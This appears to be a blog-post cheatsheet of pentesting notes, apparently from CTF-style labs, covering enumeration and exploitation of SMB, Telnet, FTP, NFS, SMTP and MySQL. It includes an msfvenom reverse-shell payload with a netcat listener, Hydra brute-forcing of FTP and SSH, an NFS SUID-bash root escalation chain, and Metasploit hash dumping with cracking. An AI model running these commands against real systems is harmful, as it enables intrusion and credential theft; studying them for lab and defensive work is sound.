---
layout: post
title: Services list cheatsheet
subtitle: List of common services and their usual exploitation
cover-img: /assets/img/back.jpg
thumbnail-img: /assets/img/back.png
share-img: /assets/img/back.jpg
---
<style>
a.section {
    display: block;
    position: relative;
    top: -100px;
    visibility: hidden;
}
</style>

>Before everything: make a nmap scan for finding open and vulnerable ports.

# Table of contents

- [SMB](#SMB)
- [TELNET](#Telnet)
- [FTP](#FTP)
- [NFS](#NFS)
- [SMTP](#SMTP)
- [MYSQL](#MYSQL)

# SMB <a class="section" id="SMB"></a>

Clients connect to servers using TCP/IP (actually NetBIOS over TCP/IP as specified in RFC1001 and RFC1002), NetBEUI or IPX/SPX. 

#### Enum4linux

It is a tool used to enumerate SMB shares. Makes it easy to quickly extract information from the target pertaining to SMB.

```bash
SYNTAX = "enum4linux [options] ip"
    
OPTIONS:
 
 -U             get userlist
 -M             get machine list
 -N             get namelist dump (different from -U and-M)
 -S             get sharelist
 -P             get password policy information
 -G             get group and member list

 -a             all of the above (full basic enumeration)
```

#### Exploiting SMB
find vulnerabilities in <https://www.cvedetails.com/>

#### Using SMBCLIENT


```bash
SYNTAX: "smbclient //[IP]/[SHARE]"

Followed by: 

-U [name] : to specify the user

-p [port] : to specify the port

```
# Telnet <a class="section" id="Telnet"></a>
 
```bash
SYNTAX: "telnet [ip][port]"
```

#### Enumerating telnet
 
check:
<https://www.cvedetails.com> or
<https://cve.mitre.org>
for finding vulnerabilities.

Also, we can find an obvious misconfiguration that let us exploit it.
 
#### Connecting Telnet

```bash
SYNTAX: "telnet [ip] [port]"
```

In case we can`t see if we are executing what we type we can use **tcpdump**

```bash
"sudo tcpdump ip proto \\icmp -i tun0" //tun0 = network interface in use
```

We need to preface the commands in the telnet machine terminal with ".RUN" 
ex:

```bash
".RUN ping -c 1 [attackingMachine.localhost]" //we can use that command to see that we are correctly executing code
```
 
#### Generating a reverse shell payload (using msfvenom)
 
```bash
SYNTAX: "msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R"
```
Where:
-p = payload
lhost = our local host IP address (this is your machine IP address)
lport = the port to listen on (this is the port on your machine)
R = export the payload in raw format


Now we can use a netcat listener on our local machine:
```bash
"nc -lvp [listening port]" 
```

We just need to copy and paste our msfvenom payload into the telnet session and run it as a command. Then we'll be able to use a shell through the listener previously deployed.
 
# FTP <a class="section" id="FTP"></a>
 
Standard FTP port = 21
 
#### Enumerating ftp
 
We're going to be exploiting an anonymous FTP login, to see what files we can access- and if they contain any information that might allow us to pop a shell on the system.
 
Alternative Enumeration Methods

It's worth noting  that some vulnerable versions of in.ftpd and some other FTP server variants return different responses to the "cwd" command for home directories which exist and those that don’t.
 
```bash
"ftp [IP]"
```

#### Exploiting FTP

If we have a possible username we can try to apply bruteforce using hydra.

```bash
"hydra -t 4 -l [USER] dale -P [PATH TO DICTIONARY] -vV [MACHINE IP] ftp"
```

PATH TO DICTIONARY in my case is: /usr/share/wordlists/passwords/rock-you05.txt

# NFS <a class="section" id="NFS"></a>

Mounting NFS shares:
```
sudo mount -t nfs IP:share /tmp/mount/ -nolock
```
Tag 	Function
sudo 	Run as root
mount 	Execute the mount command
-t nfs 	Type of device to mount, then specifying that it's NFS
IP:share 	The IP Address of the NFS server, and the name of the share we wish to mount
-nolock 	Specifies not to use NLM locking

#### Exploiting NFS

We are going to use SUID permissions

```
Using: sudo chmod +s
```
```
    NFS Access ->

        Gain Low Privilege Shell ->

            Upload Bash Executable to the NFS share ->

                Set SUID Permissions Through NFS Due To Misconfigured Root Squash ->

                    Login through SSH ->

                        Execute SUID Bit Bash Executable ->

                            ROOT ACCESS
```

# SMTP <a class="section" id="SMTP"></a>

It usually run on port 25

#### Enumerating SMTP

VRFY (confirming the names of valid users) and EXPN (which reveals the actual address of user’s aliases and lists of e-mail (mailing lists). Using these SMTP commands, we can reveal a list of valid users.

We can do this manually, over a telnet connection- however Metasploit comes to the rescue again, providing a handy module appropriately called "smtp_enum"

- msfconsole
- smtp_version (Let us know Server version and OS)

After knowing the data we need:

- smtp_enum (Let us know username)

#### Exploiting SMTP

We are going to use the username that we got after our enumeration to bruteforce the password in the ssh port.
```
"hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV 10.10.42.55 ssh"
Where:
- hydra	Runs the hydra tool
- -t 16 Number of parallel connections per target
- -l [user]	Points to the user who's account you're trying to compromise
- -P [path to dictionary]	Points to the file containing the list of possible passwords
- -vV Sets verbose mode to very verbose, shows the login+pass combination for each attempt
[machine IP]	The IP address of the target machine
ssh / protocol	Sets the protocol
```

# MYSQL <a class="section" id="MYSQL"></a>

<https://dev.mysql.com/doc/dev/mysql-server/latest/PAGE_SQL_EXECUTION.html>

<https://www.w3schools.com/php/php_mysql_intro.asp>

#### Enumerating mysql

connect to mysql:
´´´
"mysql -h [IP] -u [username] -p" 
´´´

metaexploit:

admin/mysql/mysql_sql

#### Exploiting mysql

We'll be using mysql_schemadump, mysql_hashdump in metaexploit

in mysql_hashdump we get a non default user

Crack the user and hash with john the ripper
